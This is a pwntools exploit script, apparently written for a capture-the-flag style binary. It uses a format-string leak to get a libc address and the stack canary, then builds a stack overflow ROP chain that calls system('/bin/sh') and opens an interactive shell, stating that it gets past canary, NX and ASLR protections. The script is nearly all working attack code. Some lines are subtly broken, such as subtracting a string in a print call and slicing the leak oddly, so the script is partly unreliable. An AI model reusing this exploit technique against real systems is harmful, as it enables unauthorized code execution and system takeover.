from pwn import *

exe = context.binary = ELF("./program")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path, "%40$llx.%41$llx"] + argv, *a, **kw)


gdbscript = '''
tbreak main
continue
'''.format(**locals())


io = start()
leaked = io.readline()
print("[+] leaked address")
print(leaked)


#offset = addresses of one function in libc - base addresses
#libc-base = addresses of one function in libc - offset
print("[*] Calculating libc base")
libcbase = int(leaked[:12], 16)
libcbase = libcbase - 0x1F0FC8 # offset
print("[+] Leaked the libc base" - hex(libcbase))


ret = libcbase + 0x0000000000002379 # ret
poprdi = libcbase + 0x0000000000003322 
binsh = libcbase + 0x0000000000004455
system = libcbase + 0x55414
exit = libcbase + 0x49BC0


print("[+] Getting canary")
canary = int(leaked[12:29], 16)
print("[+] Leaked the stack canary "+ hex(canary))

print("[*] Crafting the payload")
print("[+] Patching stack canary")
payload = b'A' * 264
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(system)
payload += p64(exit)

print("[+] Sending payload....")
print("[+] Bypass stack canary , NX, ASLR")

io.sendline(payload)
io.interactive()

